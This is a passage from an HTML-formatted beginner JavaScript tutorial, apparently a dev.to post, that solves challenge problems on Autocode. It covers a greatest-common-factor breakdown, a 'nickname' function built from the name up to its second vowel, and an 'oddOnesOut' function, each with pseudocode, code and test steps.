&lt;p&gt;&lt;strong&gt;Line 9:&lt;/strong&gt; We use a &lt;code&gt;for loop&lt;/code&gt; and declare &lt;code&gt;num1&lt;/code&gt; to be our iterator &lt;code&gt;i&lt;/code&gt;, as long as &lt;code&gt;i&lt;/code&gt; is greater or equal to &lt;code&gt;1&lt;/code&gt; we run our for loop and decrement by &lt;code&gt;1.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 10:&lt;/strong&gt; Our &lt;code&gt;if&lt;/code&gt; statement checks to see if &lt;code&gt;num1&lt;/code&gt; modulo &lt;code&gt;i&lt;/code&gt; is equal to zero, and if &lt;code&gt;num2&lt;/code&gt; modulo &lt;code&gt;i&lt;/code&gt; equal to zero.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 11:&lt;/strong&gt; If either condition&lt;code&gt;num1 % i === 0&lt;/code&gt; or &lt;code&gt;num2 % i === 0&lt;/code&gt; returns &lt;code&gt;false&lt;/code&gt; our loop continues and the following &lt;code&gt;return&lt;/code&gt; statement is ignored. When our &lt;code&gt;if&lt;/code&gt; condition returns &lt;code&gt;true,&lt;/code&gt;that means that both conditions are met, and then we &lt;code&gt;return&lt;/code&gt; the iterator &lt;code&gt;i&lt;/code&gt;. The iterator &lt;code&gt;i&lt;/code&gt; is our greatest common factor between &lt;code&gt;num1&lt;/code&gt; and &lt;code&gt;num2&lt;/code&gt; .&lt;/p&gt;

&lt;p&gt;We did it! 🙌 Congrats! We solved Problem #1. The rest should be a breeze now that you are familiar with Autocode.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#challenge-problem%C2%A02"&gt;
  &lt;/a&gt;
  Challenge Problem #2:
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Step 1: Take your time reading the problem&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Write a function that takes in a name as a string and returns a string representing their nickname. A nickname is the name up to the second vowel repeated twice. See the examples.&lt;/p&gt;

&lt;p&gt;Examples:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;Jacob&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 'JACO-JACO'&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;pikachu&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 'PIKA-PIKA'&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;janeth&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; 'JANE-JANE'&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Step 2: Begin strategizing with pseudocode!&lt;/strong&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;
&lt;span class="c1"&gt;//First define the functions expected parameter and return type in a comment above the function&lt;/span&gt;

&lt;span class="c1"&gt;//Use module.exports to export the function and pass in a a name as a string&lt;/span&gt;

&lt;span class="c1"&gt;//Create a variable that defines all vowels inside an array&lt;/span&gt;

&lt;span class="c1"&gt;//Create a variable to keep count of vowels and set it equal to 0&lt;/span&gt;

&lt;span class="c1"&gt;//Use for loop to count through every letter in the string (name)&lt;/span&gt;

&lt;span class="c1"&gt;//Create an intermediate variable to save every character in the string&lt;/span&gt;

&lt;span class="c1"&gt;//Inside the for loop condition use indexOf() method to check and count if character is in the index of vowels&lt;/span&gt;

&lt;span class="c1"&gt;//Use toUpperCase() method to convert string to uppercase&lt;/span&gt;

&lt;span class="c1"&gt;//return a string with characters from index 0 to i (including i)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Step 3: Code it out on&lt;/strong&gt; &lt;a href="http://Autocode.com"&gt;&lt;strong&gt;Autocode&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Create a new endpoint by right-clicking the &lt;code&gt;functions&lt;/code&gt; folder on the left of the browser and select &lt;code&gt;New endpoint file&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0VhdLUzh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AboDwU39I-hbeJ_BpSXTgXg.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0VhdLUzh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AboDwU39I-hbeJ_BpSXTgXg.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Name your file &lt;code&gt;functions/nickname.js&lt;/code&gt; and translate your pseudocode to JavaScript Syntax.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="cm"&gt;/**
* My nickname function 
* @param {string} name 
* @returns {string} str
*/&lt;/span&gt;
&lt;span class="nx"&gt;module&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exports&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;vowels&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;AEIOUaeiou&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; 
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;vowelCount&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;char&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt; 
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;vowels&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
      &lt;span class="nx"&gt;vowelCount&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;vowelCount&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;toUpperCase&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; 
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;str&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;-&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;str&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Step 3: Test and Deploy your solution on&lt;/strong&gt; &lt;a href="http://Autocode.com"&gt;&lt;strong&gt;Autocode&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pass in a test &lt;code&gt;name&lt;/code&gt;parameter and select the green &lt;code&gt;Run&lt;/code&gt; button on &lt;a href="http://Autocode.com"&gt;Autocode&lt;/a&gt; to view the results on the console.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--3MlLuTj1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AgYL3SWgG7GFo3hH70ID11w.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--3MlLuTj1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AgYL3SWgG7GFo3hH70ID11w.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And sure enough, when testing different names result in nicknames! 😃&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HWb67cKd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AR9c5YsLOwDgQNw7xZNznqA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HWb67cKd--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AR9c5YsLOwDgQNw7xZNznqA.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(Jacob); // =&amp;gt; 'JACO-JACO'&lt;/p&gt;

&lt;p&gt;(pikachu); // =&amp;gt; 'PIKA-PIKA'&lt;/p&gt;

&lt;p&gt;(janeth); // =&amp;gt; 'JANE-JANE'&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Breakdown of our Solution:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 1--5&lt;/strong&gt;: We set a parameter type &lt;code&gt;string&lt;/code&gt; for &lt;code&gt;name&lt;/code&gt; and a return type of &lt;code&gt;string&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 7:&lt;/strong&gt; Weexport our async function with &lt;code&gt;module.exports&lt;/code&gt; and pass in our &lt;code&gt;(name)&lt;/code&gt; parameter&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 8:&lt;/strong&gt; We define our vowels and use the split method to break our string of vowels into an array&lt;/p&gt;

&lt;p&gt;vowels = [ 'A', 'E', 'I'...,'a', 'e', 'i'...]&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 9:&lt;/strong&gt; We set our count equal to zero&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 10:&lt;/strong&gt; We use a &lt;code&gt;for loop&lt;/code&gt; to iterate through every character in &lt;code&gt;name&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 11:&lt;/strong&gt; We set an intermediate variable to return every character in the string&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 12:&lt;/strong&gt; The if condition checks to see if a character is found in the index of vowels: &lt;code&gt;vowels.indexOf(char)&lt;/code&gt; and returns the char location in the vowels array. If the char isn't in the index of vowels, then a -1 is returned, and the loop continues to the next character. If its location is greater than -1, then the logic continues.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 13:&lt;/strong&gt; If the location is greater than &lt;code&gt;-1&lt;/code&gt; we increment our &lt;code&gt;vowelCount&lt;/code&gt; by one.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 14:&lt;/strong&gt; We check to see if the &lt;code&gt;vowelCount&lt;/code&gt; is 2, if &lt;code&gt;false&lt;/code&gt; is returned, we skip the &lt;code&gt;if&lt;/code&gt; statement and move on to the next letter, if &lt;code&gt;true&lt;/code&gt; is returned that means that we have now counted two vowels, and we break out of the &lt;code&gt;for loop.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 20:&lt;/strong&gt; We use the &lt;code&gt;slice()&lt;/code&gt; method to grab the characters starting at &lt;code&gt;index 0&lt;/code&gt; and ending at &lt;code&gt;i&lt;/code&gt;, we add &lt;code&gt;1&lt;/code&gt; to &lt;code&gt;i&lt;/code&gt; because the &lt;code&gt;slice&lt;/code&gt; method doesn't include the end value. We also use &lt;code&gt;toUpperCase()&lt;/code&gt; method to convert all the letters in our string to uppercase.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Line 21:&lt;/strong&gt; We &lt;code&gt;return&lt;/code&gt; the string plus a dash plus another string to have our result resemble the examples in the question&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#challenge-problem-3-odd-ones%C2%A0out"&gt;
  &lt;/a&gt;
  Challenge Problem #3: Odd Ones Out
&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Step 1: Read Carefully.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Write a function that takes in an array of strings and returns a new array containing only elements that appeared an even number of times in the input array.&lt;/p&gt;

&lt;p&gt;Examples:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;arr1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;a&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;b&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;b&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;c&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;d&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;c&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;c&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;d&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;\&lt;/span&gt;
&lt;span class="nx"&gt;oddOnesOut&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;arr1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; [ 'b', 'd' ]&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;arr2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;fish&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;fish&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;dog&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;cat&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;dog&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;dog&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;\&lt;/span&gt;
&lt;span class="nx"&gt;oddOnesOut&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;arr2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// =&amp;gt; [ 'fish' ] &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Step 1: Pseudo Code&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Let's strategize!&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;
&lt;span class="c1"&gt;//Create a helper function to count our elements in an array&lt;/span&gt;

&lt;span class="c1"&gt;//The helper function has one parameter that takes in an array of strings&lt;/span&gt;

&lt;span class="c1"&gt;//Use a for loop in the helper function to count our elements in the array&lt;/span&gt;

&lt;span class="c1"&gt;//Create and export a second function with a for loop to count the even elements&lt;/span&gt;

&lt;span class="c1"&gt;//Push the even elements into a new array&lt;/span&gt;

&lt;span class="c1"&gt;//Return that new array&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Step 2: Code it out on&lt;/strong&gt; &lt;a href="http://Autocode.com"&gt;&lt;strong&gt;Autocode&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Create a new endpoint by right-clicking the &lt;code&gt;functions&lt;/code&gt; folder on the left of the browser and select &lt;code&gt;New endpoint file&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Name it &lt;code&gt;functions/oddOnesOut.js.&lt;/code&gt; Delete the sample function and translate your pseudocode to JavaScript syntax as I have:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="cm"&gt;/**
* My oddOnesOut function 
* @param {array} array 
* @returns {array} str
*/&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;elementCount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;countObj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{};&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
    &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;countObj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="kc"&gt;undefined&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
      &lt;span class="nx"&gt;countObj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
      &lt;span class="nx"&gt;countObj&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;countObj&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;module&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exports&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;async&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
  &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;elementCount&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[];&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;key&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;count&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; 
      &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;count&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; 
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;push&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; 
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Step 3: Test and Deploy your solution on&lt;/strong&gt; &lt;a href="http://Autocode.com"&gt;&lt;strong&gt;Autocode&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Pass in a test &lt;code&gt;array&lt;/code&gt; parameter inside the payload window:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;{"array": ['fish', 'fish', 'dog', 'cat', 'dog', 'dog']}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Select the green &lt;code&gt;Run&lt;/code&gt; button on &lt;a href="http://Autocode.com"&gt;Autocode&lt;/a&gt; to view the results on the console:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dZjcjve1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AX5eMeFn0MC4zWTLCDQq81g.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dZjcjve1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn-images-1.medium.com/max/1600/1%2AX5eMeFn0MC4zWTLCDQq81g.png" alt=""&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Your function will filter the odd elements out and return the following:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;["fish"]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Great job!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Breakdown of Solution:&lt;/strong&gt;&lt;/p&gt;

